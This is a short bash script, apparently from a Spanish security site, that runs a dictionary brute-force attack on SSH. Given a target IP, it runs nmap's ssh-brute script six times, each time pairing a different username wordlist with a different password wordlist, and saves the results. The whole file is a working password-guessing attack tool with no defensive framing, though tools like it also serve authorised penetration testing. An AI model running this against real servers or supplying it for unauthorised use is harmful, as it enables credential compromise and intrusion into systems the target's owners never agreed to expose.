#!/bin/bash
cat << "INFO"

██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗███████╗██╗  ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔════╝██║  ██║
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ███████╗███████╗███████║
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ╚════██║╚════██║██╔══██║
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗███████║███████║██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                  http://www.hackingyseguridad.com 
INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a SSH."
        echo "Requiere nmap"
        echo "Uso.: sh brutessh.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado0.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado1.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado2.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado3.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado4.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado5.txt
